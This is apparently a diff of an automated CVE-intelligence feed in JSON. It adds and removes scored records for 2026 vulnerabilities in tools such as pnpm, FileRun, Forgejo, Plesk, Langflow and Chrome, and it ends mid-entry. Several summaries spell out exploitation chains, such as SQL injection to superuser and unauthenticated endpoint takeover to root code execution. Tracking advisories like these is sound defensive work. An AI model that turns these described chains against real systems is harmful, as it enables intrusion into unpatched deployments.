+    "published": "2026-09-10T17:17:05.950",
+    "last_modified": "2026-09-10T19:58:20.507",
+    "cvss_v3": 7.2,
     "severity": "HIGH",
     "affected": [],
-    "summary": "Compliance-trestle (Trestle) is a Python SDK and command-line tool for managing OSCAL compliance documents. In versions before 3.12.4 and versions 4.0.0 through 4.0.3, the catalog-generate, profile-generate, and ssp-generate author commands write generated Markdown to an attacker-influenced output path without path-traversal validation, allowing arbitrary file write outside the Trestle workspace. These commands join the user-supplied output argument onto the Trestle root and write to the result, but guard it only with an is_directory_name_allowed() task-name-collision check rather than the PathSecurityValidator.validate_local_path() guard used by the jinja command, so an absolute path or one containing traversal sequences escapes the workspace and writes files under an attacker-chosen location as the invoking process owner. The security boundary is crossed when a trusted CI job, shared service, or wrapper derives the output argument from repository-controlled, tenant-controlled, or otherwise untrusted data while expecting output to stay inside the workspace. When --force-overwrite is used, the selected output directory is first recursively deleted, extending the primitive to destruction of an attacker-chosen directory tree and enabling indirect code execution by overwriting files a pipeline later runs. This issue is fixed in versions 3.12.4 and 4.1.0.",
+    "summary": "FileRun before 2026.3.0 contains a SQL injection vulnerability that allows delegated or simple administrators to execute arbitrary SQL by submitting the description parameter as an array, causing the getValuesString() method in DB/DP.php to interpolate raw array values directly into an INSERT statement without parameterization. Because the underlying PDO connection uses emulated prepared statements enabling stacked queries, attackers can manipulate the df_users_permissions table to escalate a delegated administrator account to superuser privileges, and may additionally achieve code execution via unsanitized path values passed to require_once in the logs listing component.",
     "references": [
-      "https://github.com/oscal-compass/compliance-trestle/commit/37ed44f5f2e074202c8eb7c2f203c05d19461cdc",
-      "https://github.com/oscal-compass/compliance-trestle/releases/tag/v4.1.0",
-      "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-4q5v-7g7x-j79w",
-      "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-r4vp-3vw6-r2x5"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.2,
-    "epss_percentile": 9.8,
-    "tags": [
-      "file_write",
-      "rce"
-    ],
-    "intel_score": 93.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "file_write+15"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-82393",
-    "published": "2026-08-31T22:17:22.353",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 7.5,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "pnpm is a package manager. Prior to 10.34.5 and 11.11.0, pnpm accepts a scoped path traversal in a tarball dependency's package.json manifest name because pnpm11/resolving/npm-resolver/src/pickPackage.ts rejects slash characters only for unscoped names. During pnpm install, the unvalidated name reaches raw path joins in pnpm11/installing/deps-resolver/src/resolvePeers.ts, pnpm11/installing/deps-resolver/src/index.ts, and pnpm11/deps/graph-builder/src/lockfileToDepGraph.ts, causing package extraction outside node_modules and allowing attacker-controlled files to overwrite arbitrary filesystem paths even when --ignore-scripts is used. The overwrite can replace shell startup files, Git hooks, or installed package code and lead to code execution. This issue is fixed in versions 10.34.5, and 11.11.0.",
-    "references": [
-      "https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7",
-      "https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9",
-      "https://github.com/pnpm/pnpm/pull/12872",
-      "https://github.com/pnpm/pnpm/pull/12890",
-      "https://github.com/pnpm/pnpm/releases/tag/v10.34.5",
-      "https://github.com/pnpm/pnpm/releases/tag/v11.11.0",
-      "https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m",
-      "https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m"
+      "https://filerun.com/index.php/changelog?v=2026.3.0",
+      "https://vulncheck.com/blog/filerun-delegated-admin-sql-to-object-injection-rce",
+      "https://www.vulncheck.com/advisories/filerun-authenticated-sql-injection-via-groups-add-action"
     ],
     "source": "NVD",
     "cisa_kev": false,
     "epss": 0.4,
-    "epss_percentile": 34.8,
+    "epss_percentile": 36.8,
     "tags": [
-      "path_traversal",
-      "rce"
+      "rce",
+      "sqli"
     ],
-    "intel_score": 92.5,
+    "intel_score": 94.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "path_traversal+15"
+      "sqli+18"
     ]
   },
   {
@@ -1203,6 +1347,33 @@
     ]
   },
   {
+    "cve_id": "CVE-2026-26212",
+    "published": "2026-09-09T15:17:06.823",
+    "last_modified": "2026-09-10T15:17:29.467",
+    "cvss_v3": 7.2,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "Rara One Click Demo Import plugin for WordPress before 1.3.5 contains an arbitrary file upload vulnerability that allows authenticated attackers with Administrator privileges to upload arbitrary PHP files by passing a false value to wp_handle_upload() that disables WordPress core's file type validation checks across all three file parameters in the process_uploaded_files() function. Attackers can upload a malicious PHP file to the uploads directory and execute it over HTTP to achieve remote code execution in the web server process, with the uploaded file persisting on disk even after plugin deactivation and leaving no media library record to evade standard integrity checks.",
+    "references": [
+      "https://wordpress.com/plugins/rara-one-click-demo-import",
+      "https://www.vulncheck.com/advisories/rara-one-click-demo-import-arbitrary-file-upload-rce"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 38.4,
+    "tags": [
+      "file_write",
+      "rce"
+    ],
+    "intel_score": 91.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "file_write+15"
+    ]
+  },
+  {
     "cve_id": "CVE-2025-25249",
     "published": "2026-01-13T17:15:56.910",
     "last_modified": "2026-09-10T12:47:59.933",
@@ -1256,33 +1427,6 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-65974",
-    "published": "2026-08-17T21:16:46.887",
-    "last_modified": "2026-09-09T21:11:46.833",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "ERPNext is a free and open source Enterprise Resource Planning tool. Prior to 15.111.0 and 16.22.0, limited authenticated users can cross a permission boundary in Frappe safe execution because frappe.render_template is exposed without forcing restrict_globals, allowing server-side template injection and remote code execution. This issue is fixed in versions 15.111.0 and 16.22.0.",
-    "references": [
-      "https://github.com/frappe/erpnext/releases/tag/v15.111.0",
-      "https://github.com/frappe/erpnext/releases/tag/v16.22.0",
-      "https://github.com/frappe/erpnext/security/advisories/GHSA-w996-r7v3-87wr",
-      "https://github.com/frappe/frappe/commit/529d190a252863672164d10bfcd91d1de0ac1c7c"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 44.8,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 89.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
     "cve_id": "CVE-2026-19232",
     "published": "2026-09-08T20:17:28.940",
     "last_modified": "2026-09-11T14:02:47.597",
@@ -1297,6 +1441,57 @@
     "cisa_kev": false,
     "epss": 0.6,
     "epss_percentile": 45.6,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.5,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-68487",
+    "published": "2026-09-10T17:17:05.310",
+    "last_modified": "2026-09-10T19:54:25.810",
+    "cvss_v3": 9.9,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Path traversal in Plesk's Backup Manager causes arbitrary file write as root by an authenticated customer.",
+    "references": [
+      "https://support.plesk.com/hc/en-us/articles/43248841638551-Vulnerability-in-Plesk-s-Backup-Manager-unsigned-backup-header-allows-path-traversal"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.7,
+    "tags": [
+      "file_write",
+      "path_traversal"
+    ],
+    "intel_score": 89.5,
+    "reasons": [
+      "recently modified (last 48h)",
+      "path_traversal+15",
+      "file_write+15"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-89094",
+    "published": "2026-09-10T21:17:53.160",
+    "last_modified": "2026-09-10T21:17:53.160",
+    "cvss_v3": 9.9,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Forgejo before 16.0.4 allows remote code execution via a crafted template repository because template expansion on files in .forgejo/template is mishandled.",
+    "references": [
+      "https://codeberg.org/forgejo/forgejo/milestone/139655",
+      "https://news.ycombinator.com/item?id=49645907"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 41.3,
     "tags": [
       "rce"
     ],
@@ -1324,35 +1519,6 @@
     "cisa_kev": false,
     "epss": 0.7,
     "epss_percentile": 51.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 89.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-68770",
-    "published": "2026-07-31T21:17:32.440",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "sentence-transformers contains a security control bypass vulnerability that allows attackers to achieve arbitrary code execution by exploiting a logic flaw in the import_module_class helper within sentence_transformers/util/misc.py, where the guard condition includes an 'or os.path.exists(model_name_or_path)' clause that satisfies the trust gate whenever the supplied path exists on the local filesystem, regardless of the trust_remote_code=False argument. Attackers who can control or influence the contents of a model directory on disk can place malicious Python files such as modeling_*.py referenced via modules.json, causing the code to execute at import time when an application loads the model with SentenceTransformer(path, trust_remote_code=False), bypassing the documented security contract and achieving code execution within the loading process.",
-    "references": [
-      "https://github.com/huggingface/sentence-transformers",
-      "https://github.com/huggingface/sentence-transformers/commit/ae1acc3fb2aa2004577b297eb4a915ce7a03316a",
-      "https://github.com/huggingface/sentence-transformers/issues/3801",
-      "https://github.com/huggingface/sentence-transformers/pull/3807",
-      "https://www.vulncheck.com/advisories/sentence-transformers-arbitrary-code-execution-on-local-model-load-despite-trust-remote-code-false",
-      "https://github.com/huggingface/sentence-transformers/issues/3801"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 49.1,
     "tags": [
       "rce"
     ],
@@ -1391,33 +1557,6 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-66747",
-    "published": "2026-08-05T11:16:25.510",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Zbtlink router firmware ships an embedded remote-control implant, ENDLESSDOORS, present in every published build across the product line. It is the open-source ycsunjane/rctl tool built in as an OpenWrt package (librctl.so), started at boot and run as root under the process name kworker to blend in with the kernel's [kworker/*] threads. It opens no listening port; it phones home over cleartext TCP to a hardcoded command-and-control server (command channel 7000, interactive-shell callback 7001) with no authentication and no transport encryption, re-attempting contact roughly every 35 seconds. Its command handler passes any received string to popen() as uid=0, and a reserved rctlbash command returns an interactive root shell. Because the channel is unauthenticated and cleartext, control is not limited to whoever planted it: any party that answers at the C2 address, occupies the network path (DNS or route hijack), or acquires the hardcoded fallback domain obtains unauthenticated remote code execution as root.",
-    "references": [
-      "https://github.com/ycsunjane/rctl",
-      "https://www.vulncheck.com/advisories/zbt-endlessdoors",
-      "https://www.vulncheck.com/blog/zbt-endlessdoors",
-      "https://www.zbtlink.com/pages/zbt-router-firmware-download"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.7,
-    "epss_percentile": 49.5,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 89.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
     "cve_id": "CVE-2026-19001",
     "published": "2026-08-12T21:17:37.307",
     "last_modified": "2026-09-11T18:53:56.270",
@@ -1432,32 +1571,6 @@
     "cisa_kev": false,
     "epss": 0.4,
     "epss_percentile": 33.8,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 89.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-49819",
-    "published": "2026-08-13T00:17:32.747",
-    "last_modified": "2026-09-09T21:02:22.660",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "UpSnap is a wake on lan web app. Versions 4.4.1 through 5.3.5 are vulnerable to a missing-authentication / privilege-escalation chain in `pb.HandlerInitSuperuser` (`backend/pb/handlers.go:249`), reachable as `POST /api/upsnap/init-superuser`. The vulnerable code lacks any authentication, setup token, IP allow-list, or rate limit and is gated only by a `totalSuperusers > 0` count check — a condition that is false on every fresh install — allowing an unauthenticated network-adjacent attacker to register the initial superuser account, receive a long-lived JWT, and pivot to root remote code execution at `backend/networking/wake.go:43` (`exec.CommandContext(ctx, \"/bin/sh\", \"-c\", wake_cmd)`). Version 5.4.0 fixes the issue.",
-    "references": [
-      "https://github.com/seriousm4x/UpSnap/releases/tag/5.4.0",
-      "https://github.com/seriousm4x/UpSnap/security/advisories/GHSA-w4jr-728f-5jhq",
-      "https://github.com/seriousm4x/UpSnap/security/advisories/GHSA-w4jr-728f-5jhq"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.8,
-    "epss_percentile": 54.3,
     "tags": [
       "rce"
     ],
@@ -1522,35 +1635,6 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-54569",
-    "published": "2026-08-26T16:16:27.733",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "SENAITE.CORE is the core framework for the SENAITE laboratory information management system. From 2.0.0 to 2.6.0, the SENAITE.CORE JSON API permits unauthenticated remote code execution through a two-request chain involving missing authorization and unsafe evaluation. The state-changing routes in src/bika/lims/jsonapi/update.py, including update, update_many, remove, doActionFor, doActionFor_many, and getusers, do not enforce the senaite.core: Access JSON API permission before resolving attacker-selected objects. In src/bika/lims/jsonapi/init.py, set_fields_from_request passes raw request values for RecordsField and RecordField instances to eval() before field mutator write-permission checks execute. An anonymous attacker can discover the bika_setup object identifier through @@uuid, send a value such as RejectionReasons to /@@API/update, and execute arbitrary Python in the Zope worker before a later mutation failure rolls back ZODB changes. The same unsafe evaluation pattern is present in src/senaite/core/browser/fields/record.py and src/senaite/core/browser/fields/records.py. Successful exploitation can expose or modify laboratory data, files, and accounts and can disrupt the service.",
-    "references": [
-      "https://github.com/senaite/senaite.core/commit/a24d65e99a17ac43c5374ed9f0a60d0fe60d2f74",
-      "https://github.com/senaite/senaite.core/commit/ef4b6d73575b0fbc0edc6114e5e025089aaf9eb7",
-      "https://github.com/senaite/senaite.core/pull/2903",
-      "https://github.com/senaite/senaite.core/pull/2919",
-      "https://github.com/senaite/senaite.core/security/advisories/GHSA-jrw6-7x4q-w25j",
-      "https://github.com/senaite/senaite.core/security/advisories/GHSA-jrw6-7x4q-w25j"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.8,
-    "epss_percentile": 53.8,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 89.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
     "cve_id": "CVE-2026-44402",
     "published": "2026-09-04T16:17:25.250",
     "last_modified": "2026-09-10T15:53:23.707",
@@ -1577,22 +1661,243 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-50894",
-    "published": "2026-09-04T21:17:25.177",
-    "last_modified": "2026-09-09T20:18:05.577",
+    "cve_id": "CVE-2026-21095",
+    "published": "2026-09-09T05:17:21.663",
+    "last_modified": "2026-09-11T13:17:07.707",
     "cvss_v3": 9.8,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "easyadmin v2.0.2.2 is vulnerable to Unrestricted Upload of File with Dangerous Type in the background management interface which allows authenticated remote attackers to execute arbitrary code and gain server privileges via a crafted file upload.",
+    "summary": "Heap-based buffer overflow in DNG decoder of libimagecodec.quram.so prior to SMR Sep-2026 Release 1 allows remote attackers to execute arbitrary code.",
     "references": [
-      "https://github.com/lilil3333/cve/issues/1",
-      "https://github.com/zhongshaofa/easyadmin/",
-      "https://github.com/lilil3333/cve/issues/1"
+      "https://security.samsungmobile.com/securityUpdate.smsb?year=2026&month=09"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 38.4,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-21096",
+    "published": "2026-09-09T05:17:21.783",
+    "last_modified": "2026-09-11T13:17:07.897",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Heap-based buffer overflow in JPEG decoder of libimagecodec.quram.so prior to SMR Sep-2026 Release 1 allows remote attackers to execute arbitrary code.",
+    "references": [
+      "https://security.samsungmobile.com/securityUpdate.smsb?year=2026&month=09"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 38.4,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-85102",
+    "published": "2026-09-09T13:20:43.793",
+    "last_modified": "2026-09-10T04:18:18.243",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Improper certificate trust validation during VPN negotiation in Check Point Quantum Security Gateway may allow an unauthenticated remote attacker to execute arbitrary code on the Gateway.",
+    "references": [
+      "https://support.checkpoint.com/results/sk/sk1000117"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 25.9,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-85103",
+    "published": "2026-09-09T13:20:43.997",
+    "last_modified": "2026-09-10T04:18:18.390",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "A heap-based buffer overflow in VPN certificate ASN.1 decoding may allow an unauthenticated remote attacker to execute arbitrary code on Check Point Quantum Security Management and Quantum Security Gateway systems.",
+    "references": [
+      "https://support.checkpoint.com/results/sk/sk1000118"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.5,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-36433",
+    "published": "2026-09-09T21:17:01.983",
+    "last_modified": "2026-09-10T16:17:11.753",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "An issue in Actions Semiconductor Co. Ltd Tool- Media Player Utilities v.4.46 allows a physically proximate attacker execute arbitrary code via the Production.dll and RdiskUpgrade.exe components",
+    "references": [
+      "https://bytescan.net/CVE/CVE-2026-36433.html",
+      "https://bytescan.net/CVE/CVE-2026-36433.html"
     ],
     "source": "NVD",
     "cisa_kev": false,
     "epss": 0.5,
     "epss_percentile": 39.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-71805",
+    "published": "2026-09-09T22:18:19.043",
+    "last_modified": "2026-09-10T16:17:53.127",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "An arbitrary file upload and path traversal vulnerability exists in LZ-litchi 1.0.0. Unauthenticated remote attackers can upload arbitrary files and write them outside the intended storage directory via the directory parameter in POST /app-api/infra/file/upload.",
+    "references": [
+      "https://github.com/W000i/vuln/issues/9",
+      "https://github.com/W000i/vuln/issues/9"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.5,
+    "tags": [
+      "file_write",
+      "path_traversal"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "path_traversal+15",
+      "file_write+15"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-80351",
+    "published": "2026-09-10T08:16:58.947",
+    "last_modified": "2026-09-10T16:17:56.967",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Improper neutralization of directives in dynamically evaluated code ('eval injection') vulnerability in Apache Camel K.\n\n\n\nAn improper neutralization of directives in dynamically evaluated Maven configuration allows tenant-controlled repository content to influence code execution within the operator pod, potentially enabling tenants to execute arbitrary code with the privileges of the operator.\n\n\n\nThis issue affects Apache Camel K: from 2.0.0 before 2.9.3, from 2.10.1 before 2.10.2.\n\n\n\nUsers are recommended to upgrade to version 2.9.3, 2.10.2 or 2.11.0, which fixes the issue.",
+    "references": [
+      "https://camel.apache.org/security/CVE-2026-80351.html",
+      "http://www.openwall.com/lists/oss-security/2026/09/10/14"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 34.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-52098",
+    "published": "2026-09-10T17:17:04.940",
+    "last_modified": "2026-09-10T19:54:25.810",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "An issue in Flowise 3.1.2 allows a remote attacker to execute arbitrary code via the /api/v1/prediction/<flowId> endpoint",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise",
+      "https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/utils/constants.ts",
+      "https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/utils/validateKey.ts"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.8,
+    "epss_percentile": 54.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-85025",
+    "published": "2026-09-10T21:17:51.990",
+    "last_modified": "2026-09-12T04:16:44.783",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "IBM Langflow OSS 1.0.0 through 1.11.5 Langflow could allow an unauthenticated attacker to execute arbitrary code and access or modify chat sessions through publicly shared MCP project endpoints due to improper enforcement of public-flow security restrictions and session isolation controls.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286666"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 36.3,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 89.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-81204",
+    "published": "2026-09-10T22:17:01.580",
+    "last_modified": "2026-09-12T04:16:38.837",
+    "cvss_v3": 9.8,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "IBM Langflow OSS 1.0.0 through 1.11.5 could allow a remote attacker to execute arbitrary code due to code injection during graph construction.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286666"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.6,
+    "epss_percentile": 46.9,
     "tags": [
       "rce"
     ],
@@ -1630,23 +1935,21 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-50540",
-    "published": "2026-08-07T21:17:28.827",
-    "last_modified": "2026-09-09T21:02:22.660",
+    "cve_id": "CVE-2026-87438",
+    "published": "2026-09-09T01:17:00.027",
+    "last_modified": "2026-09-10T04:18:18.867",
     "cvss_v3": 9.6,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "Kata Containers is an open source project focusing on a standard implementation of lightweight Virtual Machines (VMs) that perform like containers. Prior to version 4.0.0, kata-runtime is vulnerable to host code execution via an unvalidated configuration path annotation. The runtime accepts an arbitrary io.katacontainers.config_path pod annotation and loads the referenced host TOML file without restriction. As a result, a pod user who can place a file at a host-visible path can supply a configuration that selects an attacker-controlled hypervisor or virtio-fs daemon binary, executing code as root on the host. This issue is fixed in version 4.0.0.",
+    "summary": "Out of bounds write in WebGL in Google Chrome on on Android prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)",
     "references": [
-      "https://github.com/kata-containers/kata-containers/commit/03cc670076099530f4e1e9cb22849afdafb20f65",
-      "https://github.com/kata-containers/kata-containers/security/advisories/GHSA-mp2j-xm59-qfgw",
-      "http://www.openwall.com/lists/oss-security/2026/08/23/3",
-      "http://www.openwall.com/lists/oss-security/2026/08/24/1"
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/548127218"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 33.9,
+    "epss": 0.6,
+    "epss_percentile": 44.5,
     "tags": [
       "rce"
     ],
@@ -1657,21 +1960,698 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-53649",
-    "published": "2026-09-02T18:19:59.973",
-    "last_modified": "2026-09-09T21:09:13.080",
+    "cve_id": "CVE-2026-87448",
+    "published": "2026-09-09T01:17:01.113",
+    "last_modified": "2026-09-10T04:18:19.397",
     "cvss_v3": 9.6,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "Joro is a web exploitation framework. Prior to version 1.1.1, Joro's default proxy mode exposes a local API on 127.0.0.1:9090 that performs no authentication and applies a wildcard CORS policy. Because plugin uploads use the CORS-safelisted multipart/form-data content type, cross-origin JavaScript on any page the operator visits can reach privileged endpoints - including uploading a native plugin and triggering a restart - directly through the operator's browser, with no preflight or credentials. Since plugins execute on load, this yields unauthenticated remote code execution as the operator's user from a single page visit. This issue has been patched in version 1.1.1.",
+    "summary": "Use after free in DevTools in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Low)",
     "references": [
-      "https://github.com/BishopFox/joro/releases/tag/1.1.1",
-      "https://github.com/BishopFox/joro/security/advisories/GHSA-xqhv-chqm-fhcc"
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/516965176"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.2,
-    "epss_percentile": 11.9,
+    "epss": 0.5,
+    "epss_percentile": 41.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87455",
+    "published": "2026-09-09T01:17:01.883",
+    "last_modified": "2026-09-10T04:18:19.570",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Aura in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/542565481"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 35.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87464",
+    "published": "2026-09-09T01:17:02.907",
+    "last_modified": "2026-09-10T17:17:06.567",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in WebGL in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/544163112",
+      "http://www.openwall.com/lists/oss-security/2026/09/10/17",
+      "https://chromium-review.googlesource.com/c/angle/angle/+/8266365"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.6,
+    "epss_percentile": 46.2,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87470",
+    "published": "2026-09-09T01:17:03.560",
+    "last_modified": "2026-09-10T04:18:20.407",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Improper quantity validation in Tint in Google Chrome on on Mac prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/536446354"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 33.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87474",
+    "published": "2026-09-09T01:17:03.990",
+    "last_modified": "2026-09-10T04:18:20.577",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Payments in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
